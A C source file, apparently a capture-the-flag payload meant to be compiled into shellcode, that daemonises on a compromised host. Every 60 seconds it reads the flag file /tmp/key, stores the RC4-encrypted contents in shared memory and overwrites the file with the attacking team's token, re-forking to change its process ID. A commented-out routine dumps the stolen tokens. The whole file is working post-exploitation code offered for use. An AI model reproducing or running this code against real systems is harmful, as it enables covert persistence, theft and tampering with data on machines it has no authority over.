/*
 * Fill the sharedmemory with tokens. It doesn't allow multiple executions.
 *   by whats@wekk.net
 *
 * To be used with shellforge (or gcc)
 * $ gcc -D GCC createshm.c -o createshm
 *
 * To integrate with int3pids framework
 * $ cat bin | ndisasm -b32 - 
 *
 */

#ifdef GCC
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>

#endif

// Tuneable params
#define TOKENSIZE 40
#define MAXTOKENS 10000
//#define SECONDS_TO_WAIT 2
#define SECONDS_TO_WAIT 60
#define FILE_PATH_TO_OPEN "/tmp/key"
//#define FILE_PATH_TO_OPEN "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
//#define TEAM_TOKEN "1234567890123456789012345678901234567890"
#define TEAM_TOKEN "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
#define RC4_KEY "CCCCCCCCCC"
//#define OUTPUT_FD 0x01
#define OUTPUT_FD 0x44444444

// Internal defines
#define SHMKEY 0x46446644
#define SEMKEY SHMKEY+1
#define IPC_CREAT 00001000
#define IPC_NOWAIT 00004000

#if __linux__
#define SEM_UNDO 0x1000 
#endif

#if __FreeBSD__
#define SEM_UNDO 010000
#endif

struct token_t {
	char used;
	char data[TOKENSIZE];
	int uid;
}__attribute__((__packed__));

struct sharedmem_t {
	struct token_t t[MAXTOKENS];
}__attribute__((__packed__));

struct rc4_ctx {
    unsigned char state[256];
    unsigned char x, y;
} __attribute__((__packed__));

#define memset(addr, c, len) \
	int i = 0; \
    for(i = 0; i < len; i++) { \
        addr[i] = 0; \
    } 

#define memcpy(dst, orig, len) \
	int j; \
	for(j = 0; j < len; j++) { \
		dst[j] = orig[j]; \
	} 

#define get_shm(key, shm) \
	int res = shmget(SHMKEY, sizeof(struct sharedmem_t), IPC_CREAT | 0666); \
	if (res <= 0) { \
		exit(1); \
	} \
	if ((shm = (struct sharedmem_t *)shmat(res, NULL, 0)) < 0) { \
		exit(1); \
	} 

#define acquire_sem(semid)  \
	struct sembuf sops[2]; \
	sops[0].sem_num = 0; \
	sops[0].sem_op = 0; \
	sops[0].sem_flg = SEM_UNDO; \
 \
	sops[1].sem_num = 0; \
	sops[1].sem_op = 1; \
	sops[1].sem_flg = SEM_UNDO | IPC_NOWAIT; \
 \
	if (semop(semid, sops, 2) != 0) { \
		exit(1); \
	}

#define release_sem(semid)  \
	struct sembuf sops2; \
	sops2.sem_num = 0; \
	sops2.sem_op = -1; \
	sops2.sem_flg = SEM_UNDO | IPC_NOWAIT; \
	if (semop(semid, &sops2, 1) != 0) { \
		exit(1); \
	} 

#define get_sem(key, semid) \
	semid = semget(key, 1, IPC_CREAT | 0666); \

#define add_token(shm, semkey, token, uid) \
	int semid; \
	int k; \
	get_sem(semkey, semid); \
\
	acquire_sem(semid); \
\
	for (k = 0; k < MAXTOKENS; k++) { \
		if (!(shm->t[k].used)) { \
			shm->t[k].uid = uid; \
			memcpy(shm->t[k].data, token, sizeof(shm->t[k].data)); \
			shm->t[k].used = 1; \
			break; \
		} \
	} \
	release_sem(semid); 


#define shouldIStart(uid) \
	struct sembuf runSemSops[2]; \
	int runSemId = 0; \
	get_sem(SEMKEY+uid+1, runSemId); \
	\
	runSemSops[0].sem_num = 0; \
	runSemSops[0].sem_op = 0; \
	runSemSops[0].sem_flg = SEM_UNDO | IPC_NOWAIT; \
	\
	runSemSops[1].sem_num = 0; \
	runSemSops[1].sem_op = 1; \
	runSemSops[1].sem_flg = SEM_UNDO | IPC_NOWAIT; \
	\
	if (semop(runSemId, runSemSops, 2) != 0) { 	\
	 	/*write(1, "Another process running!\n", 25); */ \
		exit(0); \
	} 

#define closeFds() \
	int m = 0; \
	for (m = 0; m < 100; m++) { \
		close(m); \
	}

#define strlen(str, len) \
	len = 0; \
	unsigned char *ptr = str; \
	for (; *ptr; ptr++) { \
		len++; \
	}

#define strlen2(str, len) \
	len = 0; \
	unsigned char *ptr2 = str; \
	for (; *ptr2; ptr2++) { \
		len++; \
	}

#define readKey(readKey, len) \
	int fd = open(FILE_PATH_TO_OPEN, O_RDONLY, 0); \
	len = read(fd, readKey, TOKENSIZE); \
	close(fd);

#define writeKey(writeKey) \
	int len = 0; \
	strlen(writeKey, len); \
	fd = open(FILE_PATH_TO_OPEN, O_RDWR, 0); \
	write(fd, writeKey, len); \
	close(fd);

#define rc4_init(key, len, ctx) \
    unsigned char index1, index2;\
    unsigned char *state = ctx.state;\
    unsigned char z; \
    unsigned char cc; \
\
    z = 0; \
    do { \
        state[z] = z; \
        z++; \
    } while (z); \
\
    ctx.x = ctx.y = 0; \
    index1 = index2 = 0; \
    do { \
        index2 = key[index1] + state[z] + index2; \
		cc = state[z]; \
		state[z] = state[index2]; \
		state[index2] = cc; \
\
        index1++; \
        if (index1 >= len) \
            index1 = 0; \
        z++; \
    } while (z); 

#define rc4(data, len, ctx) \
    unsigned char *state2 = ctx.state; \
    unsigned char x = ctx.x; \
    unsigned char y = ctx.y; \
	unsigned char dd; \
    int v; \
 \
    for (v = 0; v < len; v++) { \
        unsigned char xor; \
 \
        x++; \
        y = state2[x] + y; \
		dd = state2[y]; \
		state2[y] = state2[x]; \
		state2[x] = dd; \
\
        xor = state2[x] + state2[y]; \
        data[v] ^= state2[xor]; \
    } \
    ctx.x = x; \
    ctx.y = y; \

#define strrev(str) \
	char *p1, *p2; \
	int len = 0; \
	strlen(str, len); \
\
	p1 = str; \
	p2 = str + len - 1; \
	for (; p2 > p1; ++p1, --p2) { \
		*p1 ^= *p2; \
		*p2 ^= *p1; \
		*p1 ^= *p2; \
	} \

#define itoa(n, s) \
	static char digits[] = "0123456789"; \
	int e = 0, sign; \
    \
	if ((sign = n) < 0) \
		n = -n; \
\
	do { \
		s[e++] = digits[n % 10]; \
	} while ((n /= 10) > 0); \
\
	if (sign < 0) \
		s[e++] = '-'; \
	s[e] = '\0'; \
	\
	strrev(s);

int main()	{

    struct timespec ts;
	struct sharedmem_t *shm;
	struct rc4_ctx rc4_crypt;
	unsigned char token[TOKENSIZE];
	char * ptr = 0;
	int len = 0;
	int count = 0;

	if (fork()) exit(0);
	setsid();

	int uid = getuid();

	shouldIStart(uid);
	#ifndef GCC
	closeFds();
	#endif
    get_shm(SHMKEY, shm);

    ts.tv_sec = SECONDS_TO_WAIT/2;
    ts.tv_nsec = 0;
	//write(1, "TOKENS RECOLLECTOR STARTED!\n", 28);
	while(1) {
		memset(token, 0, TOKENSIZE);
		readKey(token, len);
		if (len > 5) {
			rc4_init(RC4_KEY, sizeof(RC4_KEY), rc4_crypt);
			rc4(token, TOKENSIZE, rc4_crypt);
			add_token(shm, SEMKEY, token, uid);
			//write(1, "Added data\n", 11);
		}
		writeKey(TEAM_TOKEN);
		// Force it to change pid
		if (fork()) exit(0);
		nanosleep(&ts, NULL);
		if (fork()) exit(0);
		nanosleep(&ts, NULL);
		if (fork()) exit(0);
	}
	
	//write(1, "DONE\n", 5);
	exit(0);
	return 0;

}
/*
int main()	{
	//write(1, "OKKK\n", 5);
	int l;
	int semid;
	struct sharedmem_t *shm;
	struct rc4_ctx rc4_decrypt;
	unsigned char token[TOKENSIZE];
	unsigned char * ptr = 0;
    get_shm(SHMKEY, shm);
	get_sem(SHMKEY, semid);
	acquire_sem(semid);

	char strUid[10];
	int intUid = 0;

	for (l = 0; l < MAXTOKENS; l++) {
		if (shm->t[l].used) {
			memcpy(token, shm->t[l].data, sizeof(shm->t[l].data));
			shm->t[l].used = 0;
			shm->t[l].uid = 0;
			memset(shm->t[l].data, 0, sizeof(shm->t[l].data));
			rc4_init(RC4_KEY, sizeof(RC4_KEY), rc4_decrypt);
            rc4(token, TOKENSIZE, rc4_decrypt);
			intUid = shm->t[l].uid;
			itoa(intUid, strUid);
			strlen2(strUid, l);
			write(OUTPUT_FD, strUid, l);
			write(OUTPUT_FD, ":", 1);
			write(OUTPUT_FD, token, sizeof(shm->t[l].data));
			write(OUTPUT_FD, "\n", 1);
		}
	}

	release_sem(semid);
	//write(1, "DONE\n", 5);
	exit(0);
	return 0;
} */ 
